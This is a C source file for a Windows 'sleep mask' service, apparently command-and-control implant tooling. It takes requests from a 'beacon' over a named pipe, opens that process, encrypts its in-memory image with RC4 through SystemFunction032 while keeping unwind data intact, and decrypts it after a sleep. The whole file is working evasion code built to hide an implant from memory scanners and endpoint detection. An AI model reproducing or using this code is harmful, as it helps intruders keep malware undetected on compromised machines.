// this is the sleepmask implementation

#include <windows.h>
#include <stdio.h>

typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

#define SLEEPMASK_PIPE_NAME L"\\\\.\\pipe\\sleepmask_channel"

typedef struct _SLEEP_REQUEST {
    DWORD  ProcessId;
    DWORD  SleepTimeMs;
    ULONG_PTR ImageBase;
    DWORD  ImageSize;
} SLEEP_REQUEST, * PSLEEP_REQUEST;

typedef struct _SLEEP_RESPONSE {
    BOOL   Success;
    DWORD  ErrorCode;
} SLEEP_RESPONSE, * PSLEEP_RESPONSE;

// For storing individual memory regions to preserve
typedef struct _PRESERVE_REGION {
    ULONG_PTR RVA;
    DWORD     Size;
    PBYTE     SavedCopy;
} PRESERVE_REGION, * PPRESERVE_REGION;

// UNWIND_INFO flags
#define UNW_FLAG_NHANDLER  0x0
#define UNW_FLAG_EHANDLER  0x1
#define UNW_FLAG_UHANDLER  0x2
#define UNW_FLAG_CHAININFO 0x4

// UNWIND_INFO structure (not in standard headers for user mode)
typedef struct _UNWIND_INFO {
    BYTE VersionAndFlags;  // Version:3, Flags:5
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegisterAndOffset; // FrameRegister:4, FrameOffset:4
    // UNWIND_CODE UnwindCode[]; // Variable length array follows
} UNWIND_INFO, * PUNWIND_INFO;

typedef NTSTATUS(WINAPI* _SystemFunction032)(PUSTRING, PUSTRING);

HANDLE g_hTargetProcess = NULL;

// Calculate the total size of an UNWIND_INFO structure including variable parts
DWORD CalculateUnwindInfoSize(PBYTE pImage, DWORD unwindInfoRVA) {
    PUNWIND_INFO pUnwind = (PUNWIND_INFO)(pImage + unwindInfoRVA);

    BYTE version = pUnwind->VersionAndFlags & 0x7;
    BYTE flags = (pUnwind->VersionAndFlags >> 3) & 0x1F;
    BYTE countOfCodes = pUnwind->CountOfCodes;

    // Base size: 4 bytes header
    DWORD size = sizeof(UNWIND_INFO);

    // Add UnwindCode array: each UNWIND_CODE is 2 bytes
    size += countOfCodes * sizeof(USHORT);

    // Align to DWORD boundary (UnwindCode count must be even for alignment)
    if (countOfCodes % 2 != 0) {
        size += sizeof(USHORT);
    }

    // Check for chained unwind info or exception handler
    if (flags & UNW_FLAG_CHAININFO) {
        // Chained RUNTIME_FUNCTION follows
        size += sizeof(RUNTIME_FUNCTION);
    }
    else if (flags & (UNW_FLAG_EHANDLER | UNW_FLAG_UHANDLER)) {
        // Exception handler RVA follows (and possibly handler data)
        size += sizeof(DWORD); // Handler RVA
    }

    return size;
}

// Find all UNWIND_INFO regions referenced by .pdata
BOOL FindUnwindInfoRegions(PBYTE pImage, PRESERVE_REGION* regions, DWORD* count, DWORD maxRegions) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pImage + pDos->e_lfanew);

    // Get Exception Directory (points to .pdata)
    DWORD pdataRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD pdataSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (pdataRVA == 0 || pdataSize == 0) {
        puts("[!] No exception directory found");
        return FALSE;
    }

    PRUNTIME_FUNCTION pRuntimeFuncs = (PRUNTIME_FUNCTION)(pImage + pdataRVA);
    DWORD numFuncs = pdataSize / sizeof(RUNTIME_FUNCTION);

    printf("[+] Found %lu RUNTIME_FUNCTION entries in .pdata\n", numFuncs);

    *count = 0;

    // Track unique UNWIND_INFO addresses (some functions may share)
    DWORD seenAddresses[256] = { 0 };
    DWORD seenCount = 0;

    for (DWORD i = 0; i < numFuncs && *count < maxRegions; i++) {
        DWORD unwindRVA = pRuntimeFuncs[i].UnwindInfoAddress;

        // Check if we've already added this UNWIND_INFO
        BOOL alreadySeen = FALSE;
        for (DWORD j = 0; j < seenCount; j++) {
            if (seenAddresses[j] == unwindRVA) {
                alreadySeen = TRUE;
                break;
            }
        }

        if (!alreadySeen && seenCount < 256) {
            DWORD unwindSize = CalculateUnwindInfoSize(pImage, unwindRVA);

            regions[*count].RVA = unwindRVA;
            regions[*count].Size = unwindSize;
            regions[*count].SavedCopy = NULL;

            seenAddresses[seenCount++] = unwindRVA;
            (*count)++;
        }
    }

    printf("[+] Found %lu unique UNWIND_INFO structures to preserve\n", *count);

    return (*count > 0);
}

void HandleSleepRequest(PSLEEP_REQUEST pRequest, PSLEEP_RESPONSE pResponse) {
    DWORD OldProtect = 0;
    CHAR KeyBuf[16] = { 0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,
                        0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55 };
    USTRING Key = { 0 };
    USTRING Img = { 0 };

    _SystemFunction032 SysFunc032 = NULL;

    // Support up to 256 UNWIND_INFO regions + headers + .pdata
#define MAX_REGIONS 260
    PRESERVE_REGION Regions[MAX_REGIONS] = { 0 };
    DWORD RegionCount = 0;

    printf("[SLEEPMASK] Handling request: PID=%lu, Base=0x%p, Size=%lu, Time=%lums\n",
        pRequest->ProcessId, (PVOID)pRequest->ImageBase,
        pRequest->ImageSize, pRequest->SleepTimeMs);

    g_hTargetProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE,
        pRequest->ProcessId
    );

    if (!g_hTargetProcess) {
        printf("[!] Failed to open target process: %lu\n", GetLastError());
        pResponse->Success = FALSE;
        pResponse->ErrorCode = GetLastError();
        return;
    }

    printf("[+] Opened target process handle: 0x%p\n", g_hTargetProcess);

    SysFunc032 = (_SystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
    if (!SysFunc032) {
        puts("[!] Failed to resolve SystemFunction032");
        pResponse->Success = FALSE;
        pResponse->ErrorCode = ERROR_PROC_NOT_FOUND;
        CloseHandle(g_hTargetProcess);
        return;
    }

    // Read remote process memory
    PBYTE remoteImage = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pRequest->ImageSize);
    SIZE_T bytesRead = 0;

    if (!ReadProcessMemory(g_hTargetProcess, (PVOID)pRequest->ImageBase,
        remoteImage, pRequest->ImageSize, &bytesRead)) {
        printf("[!] Failed to read remote memory: %lu\n", GetLastError());
        pResponse->Success = FALSE;
        pResponse->ErrorCode = GetLastError();
        HeapFree(GetProcessHeap(), 0, remoteImage);
        CloseHandle(g_hTargetProcess);
        return;
    }

    printf("[+] Read %zu bytes from remote process\n", bytesRead);

    // Get PE info
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)remoteImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(remoteImage + pDos->e_lfanew);

    // 1. Preserve PE Headers
    Regions[RegionCount].RVA = 0;
    Regions[RegionCount].Size = pNt->OptionalHeader.SizeOfHeaders;
    Regions[RegionCount].SavedCopy = NULL;
    printf("[+] Will preserve PE Headers: RVA=0x0 Size=%lu\n", Regions[RegionCount].Size);
    RegionCount++;

    // 2. Preserve .pdata section
    DWORD pdataRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD pdataSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    Regions[RegionCount].RVA = pdataRVA;
    Regions[RegionCount].Size = pdataSize;
    Regions[RegionCount].SavedCopy = NULL;
    printf("[+] Will preserve .pdata: RVA=0x%lx Size=%lu\n", pdataRVA, pdataSize);
    RegionCount++;

    // 3. Find and preserve only UNWIND_INFO structures (not entire .rdata)
    DWORD unwindCount = 0;
    PRESERVE_REGION unwindRegions[256] = { 0 };

    if (FindUnwindInfoRegions(remoteImage, unwindRegions, &unwindCount, 256)) {
        DWORD totalUnwindBytes = 0;
        for (DWORD i = 0; i < unwindCount && RegionCount < MAX_REGIONS; i++) {
            Regions[RegionCount] = unwindRegions[i];
            totalUnwindBytes += unwindRegions[i].Size;
            RegionCount++;
        }
        printf("[+] Total UNWIND_INFO bytes to preserve: %lu (vs full .rdata)\n", totalUnwindBytes);
    }

    // Save plaintext copies of all regions
    for (DWORD i = 0; i < RegionCount; i++) {
        Regions[i].SavedCopy = (PBYTE)HeapAlloc(GetProcessHeap(), 0, Regions[i].Size);
        if (Regions[i].SavedCopy) {
            memcpy(Regions[i].SavedCopy, remoteImage + Regions[i].RVA, Regions[i].Size);
        }
    }
    printf("[+] Saved %lu regions\n", RegionCount);

    // Change remote protection to RW
    if (!VirtualProtectEx(g_hTargetProcess, (PVOID)pRequest->ImageBase,
        pRequest->ImageSize, PAGE_READWRITE, &OldProtect)) {
        printf("[!] Failed to change protection to RW: %lu\n", GetLastError());
        pResponse->Success = FALSE;
        pResponse->ErrorCode = GetLastError();
        goto cleanup;
    }

    printf("[+] Changed remote protection to RW (old: 0x%lx)\n", OldProtect);

    // Encrypt the local copy (whole image)
    Key.Buffer = KeyBuf;
    Key.Length = Key.MaximumLength = 16;
    Img.Buffer = remoteImage;
    Img.Length = Img.MaximumLength = pRequest->ImageSize;

    SysFunc032(&Img, &Key);
    printf("[+] Encrypted local copy\n");

    // Restore only the essential regions
    for (DWORD i = 0; i < RegionCount; i++) {
        if (Regions[i].SavedCopy) {
            memcpy(remoteImage + Regions[i].RVA, Regions[i].SavedCopy, Regions[i].Size);
        }
    }
    printf("[+] Patched back %lu unwind regions\n", RegionCount);

    // Write encrypted image to remote process
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(g_hTargetProcess, (PVOID)pRequest->ImageBase,
        remoteImage, pRequest->ImageSize, &bytesWritten)) {
        printf("[!] Failed to write encrypted data: %lu\n", GetLastError());
    }

    printf("[+] Wrote encrypted data to remote process\n");
    printf("[*] Sleeping for %lu ms...\n", pRequest->SleepTimeMs);

    // Sleep
    Sleep(pRequest->SleepTimeMs);

    printf("[*] Waking up, decrypting...\n");

    // Decrypt
    SysFunc032(&Img, &Key);

    // Restore regions again
    for (DWORD i = 0; i < RegionCount; i++) {
        if (Regions[i].SavedCopy) {
            memcpy(remoteImage + Regions[i].RVA, Regions[i].SavedCopy, Regions[i].Size);
        }
    }

    // Write decrypted data back
    if (!WriteProcessMemory(g_hTargetProcess, (PVOID)pRequest->ImageBase,
        remoteImage, pRequest->ImageSize, &bytesWritten)) {
        printf("[!] Failed to write decrypted data: %lu\n", GetLastError());
    }

    printf("[+] Wrote decrypted data to remote process\n");

    // Restore protection to RX
    DWORD dummy;
    if (!VirtualProtectEx(g_hTargetProcess, (PVOID)pRequest->ImageBase,
        pRequest->ImageSize, PAGE_EXECUTE_READ, &dummy)) {
        printf("[!] Failed to restore protection: %lu\n", GetLastError());
    }

    printf("[+] Restored remote protection to RX\n");
    pResponse->Success = TRUE;
    pResponse->ErrorCode = 0;
    puts("[+] Sleep mask cycle complete!");

cleanup:
    HeapFree(GetProcessHeap(), 0, remoteImage);
    for (DWORD i = 0; i < RegionCount; i++) {
        if (Regions[i].SavedCopy) {
            HeapFree(GetProcessHeap(), 0, Regions[i].SavedCopy);
        }
    }
    CloseHandle(g_hTargetProcess);
}

int main() {
    HANDLE hPipe;
    BOOL connected;
    SLEEP_REQUEST request;
    SLEEP_RESPONSE response;
    DWORD bytesRead, bytesWritten;

    puts("[SLEEPMASK] Starting sleep mask service...");

    while (TRUE) {
        hPipe = CreateNamedPipeW(
            SLEEPMASK_PIPE_NAME,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1,
            sizeof(SLEEP_RESPONSE),
            sizeof(SLEEP_REQUEST),
            0,
            NULL
        );

        if (hPipe == INVALID_HANDLE_VALUE) {
            printf("[!] Failed to create pipe: %lu\n", GetLastError());
            return 1;
        }

        puts("[*] Waiting for beacon connection...");

        connected = ConnectNamedPipe(hPipe, NULL) ?
            TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

        if (connected) {
            puts("[+] Beacon connected!");

            if (ReadFile(hPipe, &request, sizeof(request), &bytesRead, NULL)) {
                memset(&response, 0, sizeof(response));
                HandleSleepRequest(&request, &response);
                WriteFile(hPipe, &response, sizeof(response), &bytesWritten, NULL);
            }
        }

        CloseHandle(hPipe);
    }

    return 0;
}